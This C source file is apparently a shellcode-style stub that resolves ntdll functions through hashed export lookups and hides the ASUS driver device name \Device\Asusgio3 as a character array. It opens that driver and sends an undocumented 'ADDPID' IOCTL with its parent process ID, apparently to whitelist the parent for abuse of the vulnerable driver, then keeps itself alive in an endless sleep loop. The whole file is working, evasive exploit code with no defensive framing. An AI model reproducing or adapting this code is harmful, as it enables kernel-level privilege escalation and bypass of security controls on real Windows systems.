#include <Windows.h>
#include <intrin.h>

#include "ntdef.h"

#pragma comment(linker, "/merge:.rdata=.text")

typedef NTSTATUS( NTAPI* pNtCreateFile )(
	_Out_ PHANDLE FileHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_opt_ PLARGE_INTEGER AllocationSize,
	_In_ ULONG FileAttributes,
	_In_ ULONG ShareAccess,
	_In_ ULONG CreateDisposition,
	_In_ ULONG CreateOptions,
	_In_reads_bytes_opt_( EaLength ) PVOID EaBuffer,
	_In_ ULONG EaLength );

typedef NTSTATUS( NTAPI* pNtDeviceIoControlFile )(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_ ULONG IoControlCode,
	_In_reads_bytes_opt_( InputBufferLength ) PVOID InputBuffer,
	_In_ ULONG InputBufferLength,
	_Out_writes_bytes_opt_( OutputBufferLength ) PVOID OutputBuffer,
	_In_ ULONG OutputBufferLength );

typedef VOID( NTAPI* pRtlInitUnicodeString )(
	_Out_ PUNICODE_STRING DestinationString,
	_In_opt_ PCWSTR SourceString );

typedef NTSTATUS( NTAPI* pNtDelayExecution )(
	_In_ BOOLEAN Alertable,
	_In_opt_ PLARGE_INTEGER DelayInterval );

typedef NTSTATUS( NTAPI* pNtQueryInformationProcess )(
	_In_ HANDLE ProcessHandle,
	_In_ PROCESS_INFORMATION_CLASS ProcessInformationClass,
	_Out_writes_bytes_( ProcessInformationLength ) PVOID ProcessInformation,
	_In_ ULONG ProcessInformationLength,
	_Out_opt_ PULONG ReturnLength );


#define NtCreateFile_Hash				0x71e2bc4a
#define NtDeviceIoControlFile_Hash      0xc24c2e8e
#define RtlInitUnicodeString_Hash		0xcd51673e
#define NtDelayExecution_Hash           0x547718e5
#define NtQueryInformationProcess_Hash  0x47ccd80a

#define ASIO_ADDPID_IOCTL 0xA040A490

//
// thanks
//
__forceinline unsigned long long comphash( char* c )
{
	unsigned long hash = 0;

	while ( *c != 0 )
	{
		hash ^= *c++;
		hash = _rotl( hash, 3 ) + 1;
	}

	return hash;
}

__forceinline void* get_export( void* image, DWORD fn_hash )
{
	PIMAGE_DOS_HEADER DosHeader = ( PIMAGE_DOS_HEADER ) image;
	if ( DosHeader->e_magic != IMAGE_DOS_SIGNATURE )
		return NULL;

	PIMAGE_NT_HEADERS NtHeader = ( PIMAGE_NT_HEADERS ) (( ULONG ) DosHeader + DosHeader->e_lfanew);
	if ( NtHeader->Signature != IMAGE_NT_SIGNATURE )
		return NULL;

	PIMAGE_EXPORT_DIRECTORY ExportDir = ( PIMAGE_EXPORT_DIRECTORY ) (( ULONG ) DosHeader + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress);

	PULONG Names = ( PULONG ) (( ULONGLONG ) DosHeader + ExportDir->AddressOfNames);
	PULONG Functions = ( PULONG ) (( ULONGLONG ) DosHeader + ExportDir->AddressOfFunctions);
	PWORD Ordinals = ( PWORD ) (( ULONGLONG ) DosHeader + ExportDir->AddressOfNameOrdinals);

	for ( SIZE_T i = 0; i < ExportDir->NumberOfNames; ++i )
	{
		char* name = ( char* ) (( ULONGLONG ) DosHeader + Names[ i ]);
		void* func = ( void* ) (( ULONGLONG ) DosHeader + Functions[ Ordinals[ i ] ]);

		if ( comphash( name ) == fn_hash )
			return func;
	}

	return NULL;
}

int _entry( void )
{
	pRtlInitUnicodeString RtlInitUnicodeString;
	pNtCreateFile NtCreateFile;
	pNtDelayExecution NtDelayExecution;
	pNtDeviceIoControlFile NtDeviceIoControlFile;
	pNtQueryInformationProcess NtQueryInformationProcess;

	OBJECT_ATTRIBUTES obj_attr;
	IO_STATUS_BLOCK io_status;

	PPEB peb = ( PPEB ) __readfsdword( 0x30 );

	PLDR_DATA_TABLE_ENTRY head = ( PLDR_DATA_TABLE_ENTRY ) peb->Ldr->InLoadOrderModuleList.Flink;
	PVOID ntdll_base = ( ( PLDR_DATA_TABLE_ENTRY ) head->InLoadOrderLinks.Flink )->DllBase;

	RtlInitUnicodeString = ( pRtlInitUnicodeString ) get_export( ntdll_base, RtlInitUnicodeString_Hash );
	NtCreateFile = ( pNtCreateFile ) get_export( ntdll_base, NtCreateFile_Hash );
	NtDelayExecution = ( pNtDelayExecution ) get_export( ntdll_base, NtDelayExecution_Hash );
	NtDeviceIoControlFile = ( pNtDeviceIoControlFile ) get_export( ntdll_base, NtDeviceIoControlFile_Hash );
	NtQueryInformationProcess = ( pNtQueryInformationProcess ) get_export( ntdll_base, NtQueryInformationProcess_Hash );

	if ( !RtlInitUnicodeString || !NtCreateFile || !NtDelayExecution || !NtDeviceIoControlFile || !NtQueryInformationProcess )
		goto FAILURE;

	NTSTATUS status = 0;

	wchar_t device_charmap[ ] = { L'\\', L'D', L'e', L'v', L'i', L'c', L'e', L'\\', L'A', L's', L'u', L's', L'g', L'i', L'o', L'3', 0 };

	UNICODE_STRING device_name;
	RtlInitUnicodeString( &device_name, device_charmap );

	HANDLE dev_handle = INVALID_HANDLE_VALUE;
	InitializeObjectAttributes( &obj_attr, &device_name, OBJ_CASE_INSENSITIVE, NULL, NULL );

	status = NtCreateFile( &dev_handle, GENERIC_WRITE | GENERIC_READ, &obj_attr, &io_status, NULL, 0, 0, FILE_OPEN, 0, NULL, 0 );
	if ( !NT_SUCCESS( status ) )
		goto FAILURE;

	PROCESS_BASIC_INFORMATION pbi;
	RtlSecureZeroMemory( &pbi, sizeof( pbi ) );

	ULONG RetLength = 0;

	status = NtQueryInformationProcess( ( HANDLE ) -1, (PROCESS_INFORMATION_CLASS) 0, &pbi, sizeof( pbi ), &RetLength );
	if ( !NT_SUCCESS( status ) )
		goto FAILURE;

	ULONG inherit_pid = ( ULONG ) pbi.InheritedFromUniqueProcessId;
	ULONG out = 0;

	status = NtDeviceIoControlFile( dev_handle, NULL, NULL, NULL, &io_status, ASIO_ADDPID_IOCTL, &inherit_pid, sizeof( inherit_pid ), &out, sizeof ( out ) );
	if ( NT_SUCCESS( status ) )
	{
		LARGE_INTEGER time;
		time.QuadPart = -1;

		while ( TRUE )
			NtDelayExecution( 0, &time );
	}

FAILURE:
	__debugbreak();
	
	return 0;
}